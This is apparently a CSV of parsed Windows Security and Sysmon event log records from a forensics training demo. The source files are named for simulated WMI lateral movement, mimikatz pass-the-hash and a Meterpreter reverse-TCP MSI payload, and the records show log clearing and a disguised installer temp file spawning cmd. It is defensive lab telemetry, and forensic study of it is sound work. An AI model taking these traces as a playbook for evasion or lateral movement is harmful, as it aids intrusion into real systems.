RecordNumber,EventRecordId,TimeCreated,EventId,Level,Provider,Channel,ProcessId,ThreadId,Computer,ChunkNumber,UserId,MapDescription,UserName,RemoteHost,PayloadData1,PayloadData2,PayloadData3,PayloadData4,PayloadData5,PayloadData6,ExecutableInfo,HiddenRecord,SourceFile,Keywords,ExtraDataOffset,Payload
5,563298,2019-03-18 22:15:49.6458894,4688,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,3696,WIN-77LTAPHIQ1R.example.corp,0,,A new process has been created,EXAMPLE\WIN-77LTAPHIQ1R$,,"Parent process: ",PID: 0xAE8,Parent PID: 0x248,"Mandatory label: ",Target User: \,,"C:\Windows\System32\wbem\WmiPrvSE.exe ",False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/LM_WMI_4624_4688_TargetHost.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-18""},{""@Name"":""SubjectUserName"",""#text"":""WIN-77LTAPHIQ1R$""},{""@Name"":""SubjectDomainName"",""#text"":""EXAMPLE""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E7""},{""@Name"":""NewProcessId"",""#text"":""0xAE8""},{""@Name"":""NewProcessName"",""#text"":""C:\\Windows\\System32\\wbem\\WmiPrvSE.exe""},{""@Name"":""TokenElevationType"",""#text"":""%%1936""},{""@Name"":""ProcessId"",""#text"":""0x248""},{""@Name"":""CommandLine""}]}}"
6,563299,2019-03-18 22:15:49.6767481,4688,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,3696,WIN-77LTAPHIQ1R.example.corp,0,,A new process has been created,EXAMPLE\WIN-77LTAPHIQ1R$,,"Parent process: ",PID: 0x424,Parent PID: 0xAE8,"Mandatory label: ",Target User: \,,"C:\Windows\System32\calc.exe ",False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/LM_WMI_4624_4688_TargetHost.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-20""},{""@Name"":""SubjectUserName"",""#text"":""WIN-77LTAPHIQ1R$""},{""@Name"":""SubjectDomainName"",""#text"":""EXAMPLE""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E4""},{""@Name"":""NewProcessId"",""#text"":""0x424""},{""@Name"":""NewProcessName"",""#text"":""C:\\Windows\\System32\\calc.exe""},{""@Name"":""TokenElevationType"",""#text"":""%%1936""},{""@Name"":""ProcessId"",""#text"":""0xAE8""},{""@Name"":""CommandLine""}]}}"
7,563300,2019-03-18 22:15:49.6924018,4624,LogAlways,Microsoft-Windows-Security-Auditing,Security,452,2836,WIN-77LTAPHIQ1R.example.corp,0,,Successful logon,-\-," (10.0.2.17)",Target: EXAMPLE\user01,LogonType 3,LogonId: 0x110085,AuthenticationPackageName: Kerberos,LogonProcessName: Kerberos,,-,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/LM_WMI_4624_4688_TargetHost.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-0-0""},{""@Name"":""SubjectUserName"",""#text"":""-""},{""@Name"":""SubjectDomainName"",""#text"":""-""},{""@Name"":""SubjectLogonId"",""#text"":""0x0""},{""@Name"":""TargetUserSid"",""#text"":""S-1-5-21-1587066498-1489273250-1035260531-1106""},{""@Name"":""TargetUserName"",""#text"":""user01""},{""@Name"":""TargetDomainName"",""#text"":""EXAMPLE""},{""@Name"":""TargetLogonId"",""#text"":""0x110085""},{""@Name"":""LogonType"",""#text"":""3""},{""@Name"":""LogonProcessName"",""#text"":""Kerberos""},{""@Name"":""AuthenticationPackageName"",""#text"":""Kerberos""},{""@Name"":""WorkstationName""},{""@Name"":""LogonGuid"",""#text"":""31e347dc-ff67-08b3-eadc-1ec267b1975b""},{""@Name"":""TransmittedServices"",""#text"":""-""},{""@Name"":""LmPackageName"",""#text"":""-""},{""@Name"":""KeyLength"",""#text"":""0""},{""@Name"":""ProcessId"",""#text"":""0x0""},{""@Name"":""ProcessName"",""#text"":""-""},{""@Name"":""IpAddress"",""#text"":""10.0.2.17""},{""@Name"":""IpPort"",""#text"":""49249""},{""@Name"":""ImpersonationLevel"",""#text"":""%%1833""}]}}"
8,563342,2019-03-18 22:16:19.9899444,4624,LogAlways,Microsoft-Windows-Security-Auditing,Security,452,696,WIN-77LTAPHIQ1R.example.corp,0,,Successful logon,-\-," (::1)",Target: EXAMPLE\WIN-77LTAPHIQ1R$,LogonType 3,LogonId: 0x116C7B,AuthenticationPackageName: Kerberos,LogonProcessName: Kerberos,,-,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/LM_WMI_4624_4688_TargetHost.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-0-0""},{""@Name"":""SubjectUserName"",""#text"":""-""},{""@Name"":""SubjectDomainName"",""#text"":""-""},{""@Name"":""SubjectLogonId"",""#text"":""0x0""},{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""WIN-77LTAPHIQ1R$""},{""@Name"":""TargetDomainName"",""#text"":""EXAMPLE""},{""@Name"":""TargetLogonId"",""#text"":""0x116C7B""},{""@Name"":""LogonType"",""#text"":""3""},{""@Name"":""LogonProcessName"",""#text"":""Kerberos""},{""@Name"":""AuthenticationPackageName"",""#text"":""Kerberos""},{""@Name"":""WorkstationName""},{""@Name"":""LogonGuid"",""#text"":""5fdb15ee-2283-f23c-e23b-5e5ddb11bb9c""},{""@Name"":""TransmittedServices"",""#text"":""-""},{""@Name"":""LmPackageName"",""#text"":""-""},{""@Name"":""KeyLength"",""#text"":""0""},{""@Name"":""ProcessId"",""#text"":""0x0""},{""@Name"":""ProcessName"",""#text"":""-""},{""@Name"":""IpAddress"",""#text"":""::1""},{""@Name"":""IpPort"",""#text"":""55589""},{""@Name"":""ImpersonationLevel"",""#text"":""%%1833""}]}}"
1,432901,2019-03-18 11:06:25.4852144,1102,Info,Microsoft-Windows-Eventlog,Security,856,2200,PC01.example.corp,0,,Event log cleared,EXAMPLE\user01,,SID: (S-1-5-21-1587066498-1489273250-1035260531-1106),,,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/LM_4624_mimikatz_sekurlsa_pth_source_machine.evtx,0x4020000000000000,0,"{""UserData"":{""LogFileCleared"":{""SubjectUserSid"":""S-1-5-21-1587066498-1489273250-1035260531-1106"",""SubjectUserName"":""user01"",""SubjectDomainName"":""EXAMPLE"",""SubjectLogonId"":""0x18A7875""}}}"
2,432903,2019-03-18 11:06:29.9115792,4624,LogAlways,Microsoft-Windows-Security-Auditing,Security,524,2884,PC01.example.corp,0,,Successful logon,EXAMPLE\user01," (::1)",Target: EXAMPLE\user01,LogonType 9,LogonId: 0x4530F0F,AuthenticationPackageName: Negotiate,LogonProcessName: seclogo,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/LM_4624_mimikatz_sekurlsa_pth_source_machine.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-1587066498-1489273250-1035260531-1106""},{""@Name"":""SubjectUserName"",""#text"":""user01""},{""@Name"":""SubjectDomainName"",""#text"":""EXAMPLE""},{""@Name"":""SubjectLogonId"",""#text"":""0x18A7875""},{""@Name"":""TargetUserSid"",""#text"":""S-1-5-21-1587066498-1489273250-1035260531-1106""},{""@Name"":""TargetUserName"",""#text"":""user01""},{""@Name"":""TargetDomainName"",""#text"":""EXAMPLE""},{""@Name"":""TargetLogonId"",""#text"":""0x4530F0F""},{""@Name"":""LogonType"",""#text"":""9""},{""@Name"":""LogonProcessName"",""#text"":""seclogo""},{""@Name"":""AuthenticationPackageName"",""#text"":""Negotiate""},{""@Name"":""WorkstationName""},{""@Name"":""LogonGuid"",""#text"":""00000000-0000-0000-0000-000000000000""},{""@Name"":""TransmittedServices"",""#text"":""-""},{""@Name"":""LmPackageName"",""#text"":""-""},{""@Name"":""KeyLength"",""#text"":""0""},{""@Name"":""ProcessId"",""#text"":""0x3EC""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""},{""@Name"":""IpAddress"",""#text"":""::1""},{""@Name"":""IpPort"",""#text"":""0""}]}}"
3,432904,2019-03-18 11:06:29.9115792,4672,LogAlways,Microsoft-Windows-Security-Auditing,Security,524,2884,PC01.example.corp,0,,Administrative logon,EXAMPLE\user01 (S-1-5-21-1587066498-1489273250-1035260531-1106),,"PrivilegeList: SeSecurityPrivilege, SeTakeOwnershipPrivilege, SeLoadDriverPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeImpersonatePrivilege",LogonId: 0x4530F0F,,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/LM_4624_mimikatz_sekurlsa_pth_source_machine.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-1587066498-1489273250-1035260531-1106""},{""@Name"":""SubjectUserName"",""#text"":""user01""},{""@Name"":""SubjectDomainName"",""#text"":""EXAMPLE""},{""@Name"":""SubjectLogonId"",""#text"":""0x4530F0F""},{""@Name"":""PrivilegeList"",""#text"":""SeSecurityPrivilege, SeTakeOwnershipPrivilege, SeLoadDriverPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeImpersonatePrivilege""}]}}"
4,432905,2019-03-18 11:06:29.9115792,4688,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,48,PC01.example.corp,0,,A new process has been created,EXAMPLE\PC01$,,"Parent process: ",PID: 0x440,Parent PID: 0x448,"Mandatory label: ",Target User: \,,"C:\Windows\System32\cmd.exe ",False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/LM_4624_mimikatz_sekurlsa_pth_source_machine.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-18""},{""@Name"":""SubjectUserName"",""#text"":""PC01$""},{""@Name"":""SubjectDomainName"",""#text"":""EXAMPLE""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E7""},{""@Name"":""NewProcessId"",""#text"":""0x440""},{""@Name"":""NewProcessName"",""#text"":""C:\\Windows\\System32\\cmd.exe""},{""@Name"":""TokenElevationType"",""#text"":""%%1936""},{""@Name"":""ProcessId"",""#text"":""0x448""},{""@Name"":""CommandLine""}]}}"
5,432906,2019-03-18 11:06:29.9616512,4688,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,48,PC01.example.corp,0,,A new process has been created,EXAMPLE\PC01$,,"Parent process: ",PID: 0x370,Parent PID: 0x764,"Mandatory label: ",Target User: \,,"C:\Windows\System32\conhost.exe ",False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/LM_4624_mimikatz_sekurlsa_pth_source_machine.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-18""},{""@Name"":""SubjectUserName"",""#text"":""PC01$""},{""@Name"":""SubjectDomainName"",""#text"":""EXAMPLE""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E7""},{""@Name"":""NewProcessId"",""#text"":""0x370""},{""@Name"":""NewProcessName"",""#text"":""C:\\Windows\\System32\\conhost.exe""},{""@Name"":""TokenElevationType"",""#text"":""%%1936""},{""@Name"":""ProcessId"",""#text"":""0x764""},{""@Name"":""CommandLine""}]}}"
6,433078,2019-03-18 11:06:46.3051520,4688,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,48,PC01.example.corp,0,,A new process has been created,EXAMPLE\PC01$,,"Parent process: ",PID: 0xF6C,Parent PID: 0x278,"Mandatory label: ",Target User: \,,"C:\Windows\System32\dllhost.exe ",False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/LM_4624_mimikatz_sekurlsa_pth_source_machine.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-18""},{""@Name"":""SubjectUserName"",""#text"":""PC01$""},{""@Name"":""SubjectDomainName"",""#text"":""EXAMPLE""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E7""},{""@Name"":""NewProcessId"",""#text"":""0xF6C""},{""@Name"":""NewProcessName"",""#text"":""C:\\Windows\\System32\\dllhost.exe""},{""@Name"":""TokenElevationType"",""#text"":""%%1936""},{""@Name"":""ProcessId"",""#text"":""0x278""},{""@Name"":""CommandLine""}]}}"
1,10147,2019-04-30 22:48:58.9014760,2,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1936,1644,IEWIN7,0,S-1-5-18,A process changed a file creation time,,,"ProcessID: 868, ProcessGUID: 365abb72-d0da-5cc8-0000-00109b5a3c00","RuleName: ",Image: C:\Windows\System32\msiexec.exe,TargetFilename: C:\Users\IEUser\AppData\Local\Temp\302a23.msi,CreationTimeUTC: 2019-04-30 22:43:38.892,PreviousCreationTimeUTC: 2019-04-30 22:48:58.901,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/Exec_sysmon_meterpreter_reversetcp_msipackage.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName""},{""@Name"":""UtcTime"",""#text"":""2019-04-30 22:48:58.901""},{""@Name"":""ProcessGuid"",""#text"":""365abb72-d0da-5cc8-0000-00109b5a3c00""},{""@Name"":""ProcessId"",""#text"":""868""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\msiexec.exe""},{""@Name"":""TargetFilename"",""#text"":""C:\\Users\\IEUser\\AppData\\Local\\Temp\\302a23.msi""},{""@Name"":""CreationUtcTime"",""#text"":""2019-04-30 22:43:38.892""},{""@Name"":""PreviousCreationUtcTime"",""#text"":""2019-04-30 22:48:58.901""}]}}"
2,10148,2019-04-30 22:48:59.2608510,1,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1936,1644,IEWIN7,0,S-1-5-18,Process creation,NT AUTHORITY\SYSTEM,,"ProcessID: 1892, ProcessGUID: 365abb72-d0db-5cc8-0000-0010488a3c00","RuleName: ","SHA1=99894AEF71D9D3527F392CD71F66571110593876,MD5=209A3B1901B83AEB8527ED211CCE9E4C,SHA256=1A431F6409F8E0531F600F8F988ECECECB902DA26BBAAF1DE74A5CAC29A7CB44,IMPHASH=212B2417B4778F3EE9DE3F60458E953F",ParentProcess: C:\Windows\System32\services.exe,"ParentProcessID: 464, ParentProcessGUID: 365abb72-4321-5cc9-0000-001070530000",ParentCommandLine: C:\Windows\system32\services.exe,C:\Windows\system32\vssvc.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/Exec_sysmon_meterpreter_reversetcp_msipackage.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName""},{""@Name"":""UtcTime"",""#text"":""2019-04-30 22:48:59.151""},{""@Name"":""ProcessGuid"",""#text"":""365abb72-d0db-5cc8-0000-0010488a3c00""},{""@Name"":""ProcessId"",""#text"":""1892""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\VSSVC.exe""},{""@Name"":""FileVersion"",""#text"":""6.1.7600.16385 (win7_rtm.090713-1255)""},{""@Name"":""Description"",""#text"":""Microsoft® Volume Shadow Copy Service""},{""@Name"":""Product"",""#text"":""Microsoft® Windows® Operating System""},{""@Name"":""Company"",""#text"":""Microsoft Corporation""},{""@Name"":""CommandLine"",""#text"":""C:\\Windows\\system32\\vssvc.exe""},{""@Name"":""CurrentDirectory"",""#text"":""C:\\Windows\\system32\\""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""},{""@Name"":""LogonGuid"",""#text"":""365abb72-4322-5cc9-0000-0020e7030000""},{""@Name"":""LogonId"",""#text"":""0x3E7""},{""@Name"":""TerminalSessionId"",""#text"":""0""},{""@Name"":""IntegrityLevel"",""#text"":""System""},{""@Name"":""Hashes"",""#text"":""SHA1=99894AEF71D9D3527F392CD71F66571110593876,MD5=209A3B1901B83AEB8527ED211CCE9E4C,SHA256=1A431F6409F8E0531F600F8F988ECECECB902DA26BBAAF1DE74A5CAC29A7CB44,IMPHASH=212B2417B4778F3EE9DE3F60458E953F""},{""@Name"":""ParentProcessGuid"",""#text"":""365abb72-4321-5cc9-0000-001070530000""},{""@Name"":""ParentProcessId"",""#text"":""464""},{""@Name"":""ParentImage"",""#text"":""C:\\Windows\\System32\\services.exe""},{""@Name"":""ParentCommandLine"",""#text"":""C:\\Windows\\system32\\services.exe""}]}}"
3,10149,2019-04-30 22:49:08.7608510,2,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1936,1644,IEWIN7,0,S-1-5-18,A process changed a file creation time,,,"ProcessID: 2080, ProcessGUID: 365abb72-d0da-5cc8-0000-0010216f3c00","RuleName: ",Image: C:\Windows\system32\msiexec.exe,TargetFilename: C:\Windows\Installer\304d1c.msi,CreationTimeUTC: 2019-04-30 22:43:38.892,PreviousCreationTimeUTC: 2019-04-30 22:49:07.854,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/Exec_sysmon_meterpreter_reversetcp_msipackage.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName""},{""@Name"":""UtcTime"",""#text"":""2019-04-30 22:49:07.901""},{""@Name"":""ProcessGuid"",""#text"":""365abb72-d0da-5cc8-0000-0010216f3c00""},{""@Name"":""ProcessId"",""#text"":""2080""},{""@Name"":""Image"",""#text"":""C:\\Windows\\system32\\msiexec.exe""},{""@Name"":""TargetFilename"",""#text"":""C:\\Windows\\Installer\\304d1c.msi""},{""@Name"":""CreationUtcTime"",""#text"":""2019-04-30 22:43:38.892""},{""@Name"":""PreviousCreationUtcTime"",""#text"":""2019-04-30 22:49:07.854""}]}}"
4,10150,2019-04-30 22:49:09.5421010,13,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1936,1644,IEWIN7,0,S-1-5-18,RegistryEvent (Value Set),,,"ProcessID: 2080, ProcessGUID: 365abb72-d0da-5cc8-0000-0010216f3c00","RuleName: ",Image: C:\Windows\system32\msiexec.exe,EventType: SetValue,TargetObject: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\InProgress\(Default),Details: C:\Windows\Installer\304d1d.ipi,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/Exec_sysmon_meterpreter_reversetcp_msipackage.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName""},{""@Name"":""EventType"",""#text"":""SetValue""},{""@Name"":""UtcTime"",""#text"":""2019-04-30 22:49:08.432""},{""@Name"":""ProcessGuid"",""#text"":""365abb72-d0da-5cc8-0000-0010216f3c00""},{""@Name"":""ProcessId"",""#text"":""2080""},{""@Name"":""Image"",""#text"":""C:\\Windows\\system32\\msiexec.exe""},{""@Name"":""TargetObject"",""#text"":""HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Installer\\InProgress\\(Default)""},{""@Name"":""Details"",""#text"":""C:\\Windows\\Installer\\304d1d.ipi""}]}}"
5,10151,2019-04-30 22:49:09.7608510,1,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1936,1644,IEWIN7,0,S-1-5-18,Process creation,IEWIN7\IEUser,,"ProcessID: 3680, ProcessGUID: 365abb72-d0e4-5cc8-0000-00103cb73e00","RuleName: ","SHA1=06B1640F88EDC6A7CE3303CB14A505A86B061616,MD5=E40CF1CC132F25719F86F0FC5870910D,SHA256=A89385CCD4BE489CD069C65DA10A0B952CB3DE9090EF4C9F02E1368392CD66C5,IMPHASH=481F47BBB2C9C21E108D65F52B04C448",ParentProcess: C:\Windows\System32\msiexec.exe,"ParentProcessID: 2080, ParentProcessGUID: 365abb72-d0da-5cc8-0000-0010216f3c00",ParentCommandLine: C:\Windows\system32\msiexec.exe /V,"""C:\Windows\Installer\MSI4FFD.tmp""",False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/Exec_sysmon_meterpreter_reversetcp_msipackage.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName""},{""@Name"":""UtcTime"",""#text"":""2019-04-30 22:49:08.604""},{""@Name"":""ProcessGuid"",""#text"":""365abb72-d0e4-5cc8-0000-00103cb73e00""},{""@Name"":""ProcessId"",""#text"":""3680""},{""@Name"":""Image"",""#text"":""C:\\Windows\\Installer\\MSI4FFD.tmp""},{""@Name"":""FileVersion"",""#text"":""2.2.14""},{""@Name"":""Description"",""#text"":""ApacheBench command line utility""},{""@Name"":""Product"",""#text"":""Apache HTTP Server""},{""@Name"":""Company"",""#text"":""Apache Software Foundation""},{""@Name"":""CommandLine"",""#text"":""\""C:\\Windows\\Installer\\MSI4FFD.tmp\""""},{""@Name"":""CurrentDirectory"",""#text"":""C:\\Windows\\system32\\""},{""@Name"":""User"",""#text"":""IEWIN7\\IEUser""},{""@Name"":""LogonGuid"",""#text"":""365abb72-c494-5cc8-0000-0020e4ff0000""},{""@Name"":""LogonId"",""#text"":""0xFFE4""},{""@Name"":""TerminalSessionId"",""#text"":""1""},{""@Name"":""IntegrityLevel"",""#text"":""High""},{""@Name"":""Hashes"",""#text"":""SHA1=06B1640F88EDC6A7CE3303CB14A505A86B061616,MD5=E40CF1CC132F25719F86F0FC5870910D,SHA256=A89385CCD4BE489CD069C65DA10A0B952CB3DE9090EF4C9F02E1368392CD66C5,IMPHASH=481F47BBB2C9C21E108D65F52B04C448""},{""@Name"":""ParentProcessGuid"",""#text"":""365abb72-d0da-5cc8-0000-0010216f3c00""},{""@Name"":""ParentProcessId"",""#text"":""2080""},{""@Name"":""ParentImage"",""#text"":""C:\\Windows\\System32\\msiexec.exe""},{""@Name"":""ParentCommandLine"",""#text"":""C:\\Windows\\system32\\msiexec.exe /V""}]}}"
6,10152,2019-04-30 22:49:09.7921010,7,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1936,1484,IEWIN7,0,S-1-5-18,Image loaded,,,"ProcessID: 2168, ProcessGUID: 365abb72-d0e4-5cc8-0000-001022b53e00","RuleName: ","SHA1=BCF66BE6C4D4FB0775E199C32EE2154AAC97F901,MD5=D4C89F6BCCC04D43BAC82F795A552DA5,SHA256=F7F7BF8C86CD2C6A27D20076B5713FBD60647CE0716DFEC0BB65895E92AE0830,IMPHASH=9F8EEA636265FC0065E869A2EAEFE7AF",Signed: true,Image: C:\Windows\System32\msiexec.exe,,C:\Windows\System32\vbscript.dll,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/Exec_sysmon_meterpreter_reversetcp_msipackage.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName""},{""@Name"":""UtcTime"",""#text"":""2019-04-30 22:49:08.698""},{""@Name"":""ProcessGuid"",""#text"":""365abb72-d0e4-5cc8-0000-001022b53e00""},{""@Name"":""ProcessId"",""#text"":""2168""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\msiexec.exe""},{""@Name"":""ImageLoaded"",""#text"":""C:\\Windows\\System32\\vbscript.dll""},{""@Name"":""FileVersion"",""#text"":""5.8.9600.16428""},{""@Name"":""Description"",""#text"":""Microsoft ® VBScript""},{""@Name"":""Product"",""#text"":""Microsoft ® VBScript""},{""@Name"":""Company"",""#text"":""Microsoft Corporation""},{""@Name"":""Hashes"",""#text"":""SHA1=BCF66BE6C4D4FB0775E199C32EE2154AAC97F901,MD5=D4C89F6BCCC04D43BAC82F795A552DA5,SHA256=F7F7BF8C86CD2C6A27D20076B5713FBD60647CE0716DFEC0BB65895E92AE0830,IMPHASH=9F8EEA636265FC0065E869A2EAEFE7AF""},{""@Name"":""Signed"",""#text"":""true""},{""@Name"":""Signature"",""#text"":""Microsoft Windows""},{""@Name"":""SignatureStatus"",""#text"":""Valid""}]}}"
7,10153,2019-04-30 22:49:10.1983510,1,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1936,1644,IEWIN7,0,S-1-5-18,Process creation,IEWIN7\IEUser,,"ProcessID: 2892, ProcessGUID: 365abb72-d0e5-5cc8-0000-0010dadf3e00","RuleName: ","SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5,MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE,IMPHASH=CEEFB55F764020CC5C5F8F23349AB163",ParentProcess: C:\Windows\Installer\MSI4FFD.tmp,"ParentProcessID: 3680, ParentProcessGUID: 365abb72-d0e4-5cc8-0000-00103cb73e00","ParentCommandLine: ""C:\Windows\Installer\MSI4FFD.tmp""",cmd,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/Exec_sysmon_meterpreter_reversetcp_msipackage.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName""},{""@Name"":""UtcTime"",""#text"":""2019-04-30 22:49:09.276""},{""@Name"":""ProcessGuid"",""#text"":""365abb72-d0e5-5cc8-0000-0010dadf3e00""},{""@Name"":""ProcessId"",""#text"":""2892""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\cmd.exe""},{""@Name"":""FileVersion"",""#text"":""6.1.7601.17514 (win7sp1_rtm.101119-1850)""},{""@Name"":""Description"",""#text"":""Windows Command Processor""},{""@Name"":""Product"",""#text"":""Microsoft® Windows® Operating System""},{""@Name"":""Company"",""#text"":""Microsoft Corporation""},{""@Name"":""CommandLine"",""#text"":""cmd""},{""@Name"":""CurrentDirectory"",""#text"":""C:\\Windows\\system32\\""},{""@Name"":""User"",""#text"":""IEWIN7\\IEUser""},{""@Name"":""LogonGuid"",""#text"":""365abb72-c494-5cc8-0000-0020e4ff0000""},{""@Name"":""LogonId"",""#text"":""0xFFE4""},{""@Name"":""TerminalSessionId"",""#text"":""1""},{""@Name"":""IntegrityLevel"",""#text"":""High""},{""@Name"":""Hashes"",""#text"":""SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5,MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE,IMPHASH=CEEFB55F764020CC5C5F8F23349AB163""},{""@Name"":""ParentProcessGuid"",""#text"":""365abb72-d0e4-5cc8-0000-00103cb73e00""},{""@Name"":""ParentProcessId"",""#text"":""3680""},{""@Name"":""ParentImage"",""#text"":""C:\\Windows\\Installer\\MSI4FFD.tmp""},{""@Name"":""ParentCommandLine"",""#text"":""\""C:\\Windows\\Installer\\MSI4FFD.tmp\""""}]}}"
